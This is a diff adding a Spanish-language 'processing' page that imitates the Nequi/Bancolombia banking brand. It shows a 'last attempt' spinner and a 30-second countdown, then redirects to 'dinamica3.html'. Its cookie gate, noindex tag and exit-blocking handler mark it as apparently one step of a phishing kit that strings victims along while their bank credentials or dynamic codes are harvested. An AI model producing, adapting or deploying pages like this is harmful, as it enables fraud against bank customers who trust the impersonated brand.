@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+
+<html lang="es"><head>
+<meta charset="utf-8"/>
+<meta name="robots" content="noindex,nofollow"/>
+<script>if(!/(?:^|;\s*)_nqs=/.test(document.cookie)){location.replace('index.php')}</script>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Procesando - </title>
+<!-- Tailwind CSS v3 CDN -->
+<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+<!-- Fuente  (similar a Montserrat Medium) -->
+<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+
+<script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            Pink: '#E6007E',
+            Purple: '#2F003E',
+            LightPink: '#FCEEF5',
+            InputBg: '#F7F7F9'
+          },
+          fontFamily: {
+            sans: ['Montserrat', 'Inter', 'sans-serif', 'system-ui'],
+            nequi: ['Montserrat', 'sans-serif'],
+          }
+        }
+      }
+    }
+  </script>
+<style data-purpose="custom-styling">
+    * {
+      font-family: 'Montserrat', sans-serif;
+    }
+    
+    body {
+      background: url('background.png'), linear-gradient(180deg, rgba(253, 234, 244, 0.8) 0%, rgba(245, 241, 248, 0.8) 100%);
+      background-attachment: fixed;
+      background-size: cover;
+      background-position: center;
+      min-height: 100vh;
+      font-family: 'Montserrat', sans-serif;
+    }
+    
+    .-logo-text {
+      color: #2F003E;
+      font-weight: 800;
+      letter-spacing: -1px;
+      font-family: 'Montserrat', sans-serif;
+    }
+    
+    .-logo-dot {
+      color: #E6007E;
+    }
+    
+    /* Loading spinner */
+    .spinner {
+      display: inline-block;
+      width: 50px;
+      height: 50px;
+      border: 4px solid rgba(230, 0, 126, 0.2);
+      border-radius: 50%;
+      border-top-color: #E6007E;
+      animation: spin 1s ease-in-out infinite;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    
+    /* Progress bar animation */
+    @keyframes progress {
+      0% { width: 0%; }
+      100% { width: 100%; }
+    }
+    
+    .progress-bar {
+      animation: progress 30s linear forwards;
+    }
+    
+    /* Fade in animations */
+    @keyframes fadeInUp {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+    
+    .fade-in-up {
+      animation: fadeInUp 0.6s ease-out forwards;
+    }
+    
+    .delay-100 { animation-delay: 0.1s; opacity: 0; }
+    .delay-200 { animation-delay: 0.2s; opacity: 0; }
+    .delay-300 { animation-delay: 0.3s; opacity: 0; }
+    .delay-400 { animation-delay: 0.4s; opacity: 0; }
+    .delay-500 { animation-delay: 0.5s; opacity: 0; }
+    
+    /* Footer styles */
+    .bg--dark {
+      background-color: #240030;
+    }
+    
+    .border--divider {
+      border-color: rgba(255, 255, 255, 0.3);
+    }
+    
+    .vertical-text {
+      writing-mode: vertical-rl;
+      transform: rotate(180deg);
+      font-size: 10px;
+      letter-spacing: 0.05em;
+    }
+  </style>
+</head>
+<body class="flex flex-col font-">
+<!-- BEGIN: MainHeader -->
+<header class="w-full bg-white px-6 py-4 flex justify-between items-center shadow-sm z-10" data-purpose="site-header">
+
+
+<div class="flex items-center" data-purpose="logo-container">
+    <img src="logo.svg" alt=" Logo" class="h-6 w-auto object-contain">
+</div>
+
+
+
+
+<!-- Hamburger Menu Icon -->
+<button aria-label="Menu" class="flex flex-col justify-between w-6 h-4" data-purpose="hamburger-menu">
+<span class="w-full h-0.5 bg-Purple rounded"></span>
+<span class="w-full h-0.5 bg-Purple rounded"></span>
+<span class="w-full h-0.5 bg-Purple rounded"></span>
+</button>
+</header>
+<!-- END: MainHeader -->
+<!-- BEGIN: MainContent -->
+<main class="flex-grow flex items-center justify-center p-4 relative overflow-hidden" data-purpose="processing-form-area">
+<!-- Background Decor (Circles) -->
+<div class="absolute top-[-10%] right-[-10%] w-64 h-64 bg-LightPink rounded-full opacity-50 -z-10"></div>
+<!-- Processing Card -->
+<section class="bg-white rounded-lg shadow-xl w-full max-w-sm px-6 py-10 flex flex-col items-center" data-purpose="processing-card">
+
+<!-- Spinner -->
+<div class="mb-6 fade-in-up delay-100">
+  <div class="spinner"></div>
+</div>
+
+<!-- Title -->
+<h1 class="text-Purple text-2xl font-bold mb-3 text-center font- fade-in-up delay-200">
+  Ultimo intento
+</h1>
+
+<!-- Subtitle -->
+<p class="text-Purple text-sm text-center mb-6 leading-snug font- fade-in-up delay-300">
+  Por favor espera mientras procesamos tu solicitud. Este proceso puede tardar hasta 30 segundos.
+</p>
+
+<!-- Progress bar -->
+<div class="w-full mb-6 fade-in-up delay-400">
+  <div class="text-xs text-Purple mb-2 text-center font-medium">
+    Tiempo restante: <span id="countdown">30</span>s
+  </div>
+  <div class="w-full bg-LightPink rounded-full h-1.5 overflow-hidden">
+    <div class="progress-bar bg-Pink h-full rounded-full"></div>
+  </div>
+</div>
+
+
+<!-- Footer message -->
+<p class="text-xs text-Purple/60 text-center mt-8 font- fade-in-up delay-500">
+  Por favor no cierres esta ventana
+</p>
+
+</section>
+</main>
+<!-- END: MainContent -->
+<!-- BEGIN: FooterSpacer -->
+<footer class="bg--dark text-white relative min-h-[562px] w-full max-w-[450px] mx-auto overflow-hidden p-6 flex flex-col items-center" data-purpose="footer-container">
+<!-- BEGIN: LegalVerticalText -->
+<div class="absolute left-2 bottom-8 h-fit flex items-center opacity-60 pointer-events-none" data-purpose="vertical-legal-notice">
+<span class="vertical-text uppercase font-light">
+        BANCOLOMBIA S.A. Establecimiento Bancario.
+      </span>
+</div>
+<!-- END: LegalVerticalText -->
+<!-- BEGIN: LogoHeader -->
+<div class="w-full flex justify-between items-center mb-8" data-purpose="brand-logos">
+<!--  Logo Placeholder -->
+<div class="flex items-center">
+    <img src="footerneq.svg" alt=" Logo" class="h-6 w-auto object-contain">
+</div>
+
+
+
+<div class="flex items-center gap-2">
+  <img src="colom.png" alt="Grupo" class="w-8 h-8 object-contain rounded-full bg-white/20">
+
+  <div class="text-[10px] leading-tight font-semibold">
+    Grupo<br>Bancolombia
+  </div>
+</div>
+
+
+
+</div>
+
+<!-- END: LogoHeader -->
+<!-- BEGIN: AppStoreLinks -->
+<div class="w-full flex flex-col items-center gap-4 mb-8" data-purpose="app-download-buttons">
+<div class="flex gap-2">
+<!-- Google Play Button -->
+<a class="border border-white/40 rounded-lg px-3 py-1 flex items-center gap-2 bg-transparent hover:bg-white/10 transition-colors w-36" href="#">
+<svg class="w-5 h-5" fill="currentColor" viewbox="0 0 24 24"><path d="M3,20.5V3.5C3,2.91 3.34,2.39 3.84,2.15L13.69,12L3.84,21.85C3.34,21.61 3,21.09 3,20.5M16.81,15.12L18.81,16.27C19.46,16.64 19.46,17.58 18.81,17.95L4.83,26C4.4,26.25 3.88,26.25 3.45,26L15.39,14.06L16.81,15.12M15.39,9.94L3.45,22C3.88,22.25 4.4,22.25 4.83,22L18.81,13.95C19.46,13.58 19.46,12.64 18.81,12.27L16.81,13.41L15.39,12L15.39,9.94M13.69,12L3.84,2.15C3.88,2.13 3.93,2.12 3.97,2.11L16.81,9.41L15.39,10.82L13.69,12Z"></path></svg>
+<div class="text-left">
+<div class="text-[8px] uppercase leading-none">Disponible en</div>
+<div class="text-sm font-bold leading-tight">Google Play</div>
+</div>
+</a>
+<!-- App Store Button -->
+<a class="border border-white/40 rounded-lg px-3 py-1 flex items-center gap-2 bg-transparent hover:bg-white/10 transition-colors w-36" href="#">
+<svg class="w-5 h-5" fill="currentColor" viewbox="0 0 24 24"><path d="M18.71,19.5C17.88,20.74 17,21.95 15.66,21.97C14.32,22 13.89,21.18 12.37,21.18C10.84,21.18 10.37,21.95 9.1,22C7.79,22.05 6.8,20.68 5.96,19.47C4.25,17 2.94,12.45 4.7,9.39C5.57,7.87 7.13,6.91 8.82,6.88C10.1,6.86 11.32,7.75 12.11,7.75C12.89,7.75 14.37,6.68 15.92,6.84C16.57,6.87 18.39,7.1 19.56,8.82C19.47,8.88 17.39,10.1 17.41,12.63C17.44,15.65 20.06,16.66 20.09,16.67C20.06,16.74 19.67,18.11 18.71,19.5M13,3.5C13.73,2.67 14.94,2.04 15.94,2C16.07,3.17 15.6,4.35 14.9,5.19C14.21,6.04 13.07,6.7 11.95,6.61C11.8,5.46 12.36,4.26 13,3.5Z"></path></svg>
+<div class="text-left">
+<div class="text-[8px] leading-none">Consíguelo en el</div>
+<div class="text-sm font-bold leading-tight">App Store</div>
+</div>
+</a>
+</div>
+<!-- AppGallery Button -->
+<a class="border border-white/40 rounded-lg px-3 py-1 flex items-center gap-2 bg-transparent hover:bg-white/10 transition-colors w-40" href="#">
+<div class="w-5 h-5 bg-pink-500 rounded flex items-center justify-center">
+<div class="w-3 h-3 bg-white rounded-full"></div>
+</div>
+<div class="text-left">
+<div class="text-[8px] uppercase leading-none">Explore it on</div>
+<div class="text-sm font-bold leading-tight">AppGallery</div>
+</div>
+</a>
+</div>
+<!-- END: AppStoreLinks -->
+<!-- Divider Line -->
+<hr class="w-full border-t border--divider mb-8"/>
+<!-- BEGIN: NavigationMenu -->
+<nav class="w-full flex flex-col" data-purpose="footer-nav-menu">
+<!-- Nav Item 1 -->
+<a class="flex justify-between items-center py-4 border-b border-white/5 group" href="#">
+<span class="text-xl font-medium group-hover:pl-1 transition-all">Información legal</span>
+<svg class="w-5 h-5" fill="none" stroke="currentColor" viewbox="0 0 24 24"><path d="M9 5l7 7-7 7" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg>
+</a>
+<!-- Nav Item 2 -->
+<a class="flex justify-between items-center py-4 border-b border-white/5 group" href="#">
+<span class="text-xl font-medium group-hover:pl-1 transition-all">Para personas</span>
+<svg class="w-5 h-5" fill="none" stroke="currentColor" viewbox="0 0 24 24"><path d="M9 5l7 7-7 7" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg>
+</a>
+<!-- Nav Item 3 -->
+<a class="flex justify-between items-center py-4 border-b border-white/5 group" href="#">
+<span class="text-xl font-medium group-hover:pl-1 transition-all">Para tu negocio</span>
+<svg class="w-5 h-5" fill="none" stroke="currentColor" viewbox="0 0 24 24"><path d="M9 5l7 7-7 7" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg>
+</a>
+<!-- Nav Item 4 -->
+<a class="flex justify-between items-center py-4 border-b border-white/5 group" href="#">
+<span class="text-xl font-medium group-hover:pl-1 transition-all">Ayuda</span>
+<svg class="w-5 h-5" fill="none" stroke="currentColor" viewbox="0 0 24 24"><path d="M9 5l7 7-7 7" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg>
+</a>
+<!-- Nav Item 5 -->
+<a class="flex justify-between items-center py-4 border-b border-white/5 group" href="#">
+<span class="text-xl font-medium group-hover:pl-1 transition-all">Conócenos</span>
+<svg class="w-5 h-5" fill="none" stroke="currentColor" viewbox="0 0 24 24"><path d="M9 5l7 7-7 7" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg>
+</a>
+</nav>
+<!-- END: NavigationMenu -->
+</footer>
+<!-- END: FooterSpacer -->
+
+<script>
+// Contador regresivo
+let countdown = 30;
+const countdownElement = document.getElementById('countdown');
+
+const timer = setInterval(() => {
+    countdown--;
+    countdownElement.textContent = countdown;
+    
+    if (countdown <= 0) {
+        clearInterval(timer);
+        // Redirigir a la página siguiente (puedes cambiar esto)
+        window.location.href = 'dinamica3.html';
+    }
+}, 1000);
+
+// Prevenir que el usuario cierre la ventana accidentalmente
+window.addEventListener('beforeunload', (e) => {
+    if (countdown > 0) {
+        e.preventDefault();
+        e.returnValue = 'El proceso está en curso. ¿Estás seguro de que quieres salir?';
+    }
+});
+</script>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a089f54b2cfec8e0',t:'MTc4MDk0MzMyNQ=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon='{"version":"2024.11.0","token":"0c31a6fe223a45d68e673a89115fb5be","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body></html>
